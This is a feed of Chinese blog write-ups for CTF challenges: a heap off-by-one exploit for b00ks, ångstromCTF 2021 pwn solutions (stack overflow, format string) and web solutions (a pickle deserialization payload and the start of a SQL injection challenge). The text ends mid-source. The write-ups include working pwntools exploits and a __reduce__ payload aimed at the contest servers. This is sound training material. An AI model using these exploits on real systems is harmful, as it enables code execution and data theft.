进入fast bin</span></span><br><span class="line">fake2=p64(malloc_hook<span class="number">-0x30</span>+<span class="number">0xd</span>)</span><br><span class="line">edit(<span class="number">1</span>,fake2)</span><br><span class="line"><span class="comment">#free(3)</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'b'</span>*<span class="number">0x10</span>,<span class="number">0x60</span>,<span class="string">'cba'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'b'</span>*<span class="number">0x10</span>,<span class="number">0x60</span>,<span class="string">'a'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">echo()</span><br><span class="line"><span class="comment">#申请伪造chunk 写入__malloc_hook与__realloc_hook</span></span><br><span class="line">one=base+<span class="number">0x4527a</span></span><br><span class="line">log.info(<span class="string">'one_gadget:'</span>+hex(one))</span><br><span class="line">realloc_addr=base+<span class="number">0x8471d</span></span><br><span class="line">log.info(<span class="string">'one_gadget:'</span>+hex(one))</span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one)+p64(realloc_addr))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name size:'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="off-by-one的常见点与利用思路"><a href="#off-by-one的常见点与利用思路" class="headerlink" title="off-by-one的常见点与利用思路"></a>off-by-one的常见点与利用思路</h2><p>off-by-one的常见发生在边界验证时：</p><p>1.使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节.</p><p>2.字符串操作判断时。</p><p>off-by-one的常见利用思路：</p><p>1.溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法<br>        2.溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理;（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与prev_size 是否一致。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/glibc-heap/off_by_one/</a></p><p><a href="https://www.cnblogs.com/bhxdn/p/14293978.html" target="_blank" rel="noopener">https://www.cnblogs.com/bhxdn/p/14293978.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt; off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节的情况。我看 off-by-one的理论是字字都看得懂，但是一到off-by-one的实际利用时确是不知道怎么办了。于是找了Asis CTF 2016 b00ks这道经典off-by-one题来复现学习。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ångstromCTF 2021--wp与复现记</title>
    <link href="lexsd6.github.io/2021/04/08/actf--wp/"/>
    <id>lexsd6.github.io/2021/04/08/actf--wp/</id>
    <published>2021-04-08T14:47:27.047Z</published>
    <updated>2021-04-12T08:30:34.175Z</updated>
    
    <content type="html"><![CDATA[<p>记着自己去年刚接触国外的ctf比赛入门时,第一个接触的国外ctf比赛就是ångstromCTF。但当时我web方向做了很多，但今年却一道题都没有做出来（虽然其他方向做了写）。但也应该反省下《关于年过后我发现一年前的我比现在NB这件事》了。<a id="more"></a></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="tranquil"><a href="#tranquil" class="headerlink" title="tranquil"></a>tranquil</h3><p>题目友好给了源码（第一次做外国ctf pwn都这么友好M?）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">win</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">128</span>];</span><br><span class="line">    </span><br><span class="line">    FILE *file = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Missing flag.txt. Contact an admin if you see this on remote."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fgets(flag, <span class="number">128</span>, file);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">64</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Enter the secret word: "</span>);</span><br><span class="line">    </span><br><span class="line">    gets(&amp;password);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(password, <span class="string">"password123"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Logged in! The flag is somewhere else though..."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Login failed!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// not so easy for you!</span></span><br><span class="line">    <span class="comment">// win();</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过审计发现题目给了后面函数win()，我们只要bypass <code>strcmp</code>函数即可利用栈溢出来调用win()</p><p>由于<code>strcmp</code>函数只判断到<code>\x00</code>截止，我们可以利用<code>password123%00</code>来bypass。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./tranquil'</span>)</span><br><span class="line">p=remote(<span class="string">'shell.actf.co'</span>,<span class="number">21830</span>)</span><br><span class="line"><span class="comment">#process('./tranquil')</span></span><br><span class="line"></span><br><span class="line">pay=<span class="string">'password123'</span>+(<span class="number">0x40</span>-len(<span class="string">'password123'</span>))*<span class="string">'a'</span>+p64(<span class="number">0</span>)+p64(e.symbols[<span class="string">'win'</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Sanity-Checks"><a href="#Sanity-Checks" class="headerlink" title="Sanity Checks"></a>Sanity Checks</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">64</span>];</span><br><span class="line">    <span class="keyword">int</span> ways_to_leave_your_lover = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> what_i_cant_drive = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> when_im_walking_out_on_center_circle = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> which_highway_to_take_my_telephones_to = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> when_i_learned_the_truth = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter the secret word: "</span>);</span><br><span class="line">    </span><br><span class="line">    gets(&amp;password);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(password, <span class="string">"password123"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Logged in! Let's just do some quick checks to make sure everything's in order..."</span>);</span><br><span class="line">        <span class="keyword">if</span> (ways_to_leave_your_lover == <span class="number">50</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (what_i_cant_drive == <span class="number">55</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (when_im_walking_out_on_center_circle == <span class="number">245</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (which_highway_to_take_my_telephones_to == <span class="number">61</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (when_i_learned_the_truth == <span class="number">17</span>) &#123;</span><br><span class="line">                            <span class="keyword">char</span> flag[<span class="number">128</span>];</span><br><span class="line">                            </span><br><span class="line">                            FILE *f = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">                            </span><br><span class="line">                            <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">"Missing flag.txt. Contact an admin if you see this on remote."</span>);</span><br><span class="line">                                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            </span><br><span class="line">                            fgets(flag, <span class="number">128</span>, f);</span><br><span class="line">                            </span><br><span class="line">                            <span class="built_in">printf</span>(flag);</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Nope, something seems off."</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Login failed!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上一题的基层上，增加了对4个变量的判断，打开ida发现要判断的4个变量在栈末位，每个占有2个字节于是合理推算栈空间。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'shell.actf.co'</span>,<span class="number">21303</span>)</span><br><span class="line"><span class="comment">#process('./checks')</span></span><br><span class="line">e=ELF(<span class="string">'./checks'</span>)</span><br><span class="line">pay=<span class="string">'password123\00'</span>+(<span class="number">0x60</span>-len(<span class="string">'password123\00'</span>)<span class="number">-0x14</span>)*<span class="string">'a'</span>+p32(<span class="number">0x11</span>)+p32(<span class="number">0x3d</span>)+p32(<span class="number">0xf5</span>)+p32(<span class="number">0x37</span>)+p32(<span class="number">0x32</span>)</span><br><span class="line"><span class="keyword">print</span> len(p32(<span class="number">0x11</span>)+p32(<span class="number">0x3d</span>)+p32(<span class="number">0xf5</span>)+p32(<span class="number">0x37</span>)+p32(<span class="number">0x32</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="stickystacks"><a href="#stickystacks" class="headerlink" title="stickystacks"></a>stickystacks</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Secrets</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> secret1[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> password[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> birthday[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> ssn[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">128</span>];</span><br><span class="line">&#125; Secrets;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">7</span>];</span><br><span class="line">    </span><br><span class="line">    Secrets boshsecrets = &#123;</span><br><span class="line">        .secret1 = <span class="string">"CTFs are fun!"</span>,</span><br><span class="line">        .password= <span class="string">"password123"</span>,</span><br><span class="line">        .birthday = <span class="string">"1/1/1970"</span>,</span><br><span class="line">        .ssn = <span class="string">"123-456-7890"</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    FILE *f = fopen(<span class="string">"flag.txt"</span>,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!f) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Missing flag.txt. Contact an admin if you see this on remote."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fgets(&amp;(boshsecrets.flag), <span class="number">128</span>, f);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Name: "</span>);</span><br><span class="line">    </span><br><span class="line">    fgets(name, <span class="number">6</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome, "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察代码发现<code>printf(name);</code>有格式化字符串漏洞。利用次来找flag。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#e=ELF('stickystacks')</span></span><br><span class="line">p=remote(<span class="string">'shell.actf.co'</span>,<span class="number">21820</span>)</span><br><span class="line"><span class="comment">#process('stickystacks')</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">'%42$p'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Jar（复现）"><a href="#Jar（复现）" class="headerlink" title="Jar（复现）"></a>Jar（复现）</h3><p>题目给了源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, send_file, request, make_response, redirect</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">'FLAG'</span>, <span class="string">'actf&#123;FAKE_FLAG&#125;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/pickle.jpg')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bg</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> send_file(<span class="string">'pickle.jpg'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jar</span><span class="params">()</span>:</span></span><br><span class="line">contents = request.cookies.get(<span class="string">'contents'</span>)</span><br><span class="line"><span class="keyword">if</span> contents: items = pickle.loads(base64.b64decode(contents))</span><br><span class="line"><span class="keyword">else</span>: items = []</span><br><span class="line"><span class="keyword">return</span> <span class="string">'&lt;form method="post" action="/add" style="text-align: center; width: 100%"&gt;&lt;input type="text" name="item" placeholder="Item"&gt;&lt;button&gt;Add Item&lt;/button&gt;&lt;img style="width: 100%; height: 100%" src="/pickle.jpg"&gt;'</span> + \</span><br><span class="line"><span class="string">''</span>.join(<span class="string">f'&lt;div style="background-color: white; font-size: 3em; position: absolute; top: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%; left: <span class="subst">&#123;random.random()*<span class="number">100</span>&#125;</span>%;"&gt;<span class="subst">&#123;item&#125;</span>&lt;/div&gt;'</span> <span class="keyword">for</span> item <span class="keyword">in</span> items)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/add', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">contents = request.cookies.get(<span class="string">'contents'</span>)</span><br><span class="line"><span class="keyword">if</span> contents: items = pickle.loads(base64.b64decode(contents))</span><br><span class="line"><span class="keyword">else</span>: items = []</span><br><span class="line">items.append(request.form[<span class="string">'item'</span>])</span><br><span class="line">response = make_response(redirect(<span class="string">'/'</span>))</span><br><span class="line">response.set_cookie(<span class="string">'contents'</span>, base64.b64encode(pickle.dumps(items)))</span><br><span class="line"><span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">app.run(threaded=<span class="literal">True</span>, host=<span class="string">"0.0.0.0"</span>)</span><br></pre></td></tr></table></figure><p>通过审计可以发现<code>import pickle</code>，因此可以揣摩是python的反序列化。临时，找了一篇文章：</p><p><a href="https://www.freebuf.com/articles/web/252189.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/252189.html</a></p><p>来学习了解python里的反序列化利用。</p><p>但自己在做题时踩一个坑：</p><p><code>if contents: items = pickle.loads(base64.b64decode(contents))    else: items = []</code></p><p><code>items=[]</code>代表返回值为NULL但是<code>items</code>的类型应该还是为<code>list</code>因此我们在构筑payload时应该让其<code>pickle.loads</code>后的类型为<code>list</code>。</p><p>写个脚本构造exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RCE</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.getenv, (<span class="string">'FLAG'</span>,))</span><br><span class="line"></span><br><span class="line">pickled = pickle.dumps([RCE()])<span class="comment">#注意是个list类型</span></span><br><span class="line">print(base64.b64encode(pickled).decode())</span><br></pre></td></tr></table></figure><p>得到payload转包篡改cookie。</p><p><img src="image-20210411143557147.png" alt="image-20210411143557147"></p><p>得到flag：</p><p><img src="image-20210411143808124.png" alt="image-20210411143808124"></p><p>最后提下，os.getenv可以获得环境变量里的参数。</p><p><img src="image-20210411143857541.png" alt="image-20210411143857541"></p><h3 id="Sea-of-Quills（复现）"><a href="#Sea-of-Quills（复现）" class="headerlink" title="Sea of Quills（复现）"></a>Sea of Quills（复现）</h3><p>这题也给了源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="built_in">require</span> <span class="string">'sqlite3'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> :bind, "0.0.0.0"</span><br><span class="line"><span class="keyword">set</span> :port, 4567</span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span> '/' do</span><br><span class="line">db = SQLite3::Database.new "quills.db"</span><br><span class="line">@row = db.execute( "select * from quills" )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">erb :index</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span> '/quills' do</span><br><span class="line">erb :quills</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post '/quills' do</span><br><span class="line">db = SQLite3::Database.new "quills.db"</span><br><span class="line">cols = params[:cols]</span><br><span class="line">lim = params[:limit]</span><br><span class="line">off = params[:offset]</span><br><span class="line"></span><br><span class="line">blacklist = ["-", "/", ";", "'", "\""]</span><br><span class="line"></span><br><span class="line">blacklist.each &#123; |word|</span><br><span class="line"><span class="keyword">if</span> cols.include? word</span><br><span class="line"><span class="keyword">return</span> <span class="string">"beep boop sqli detected!"</span></span><br><span class="line">end</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !<span class="regexp">/^[0-9]+$/</span>.match?(lim) || !<span class="regexp">/^[0-9]+$/</span>.match?(off)</span><br><span class="line"><span class="keyword">return</span> <span class="string">"bad, no quills for you!"</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">@row = db.execute(<span class="string">"select %s from quills limit %s offset %s"</span> % [cols, lim, off])</span><br><span class="line"></span><br><span class="line">p @row</span><br><span class="line"></span><br><span class="line">erb :specific</span><br><span 